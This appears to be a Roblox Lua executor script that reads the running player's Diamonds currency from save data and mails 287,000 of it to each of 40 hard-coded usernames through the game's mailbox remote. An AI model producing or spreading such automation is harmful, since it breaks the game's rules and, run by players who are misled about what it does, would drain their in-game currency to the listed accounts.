local usernamesString = [[
RuneNight7032
PulseValor6621
CobaltVoid8742
NovaEclipse1783
MagnetValor493
CelestialLancer1253
QuantumMaverick9292
SolsticeBlitz4730
ZenMercury2251
NimbusCobra508
EclipseHunter521
TempestFang4513
TempestXara1885
ElectricTalon7611
FluxDynamo7909
FluxDusk3468
LyricBolt2099
OnyxGuardian4967
RuneBlitz1869
AstroWolf5160
AzurePheonix1554
NovaXara2874
OrionIon2714
NebulaAstra8814
CelestialLancer2586
AuroraSpectra3186
CypherPyro4838
NovaCipher9643
OnyxFable2350
RuneIon2822
ValorNebula6320
OrionHorizon2129
AuroraPyro87
AzureDynamo6061
HarmonyDrift1249
PulseRift7617
BlazeIgnite7039
NovaValor7335
CobaltMyst921
ElectricKnight707
]]
local usernames = {}
for line in usernamesString:gmatch("([^\n]*)\n?") do
    table.insert(usernames, line)
end
local function sendMail(username, item, id, amount)
    local args = {
        [1] = username,
        [2] = "wer",
        [3] = item,
        [4] = id,
        [5] = amount
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    wait(0.5)
end


local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local Save = require(RS.Library.Client.Save)

local itemname = "Diamonds"
local classname = "Currency"  -- String needs to be in quotes
totalitem = 287000

local function GetItemID()
    local data = Save.Get()
    local inventory = data and data.Inventory
    -- Use classname variable instead of hardcoding it
    if inventory and inventory[classname] then  -- Use [] notation to access with variable
        for uid, itemData in pairs(inventory[classname]) do
            if itemData.id == itemname then
                return uid
            end
        end
    end
    return nil
end
local result = GetItemID()
for _, username in pairs(usernames) do
    sendMail(username, classname, result, totalitem)--gems
    wait(1)
end
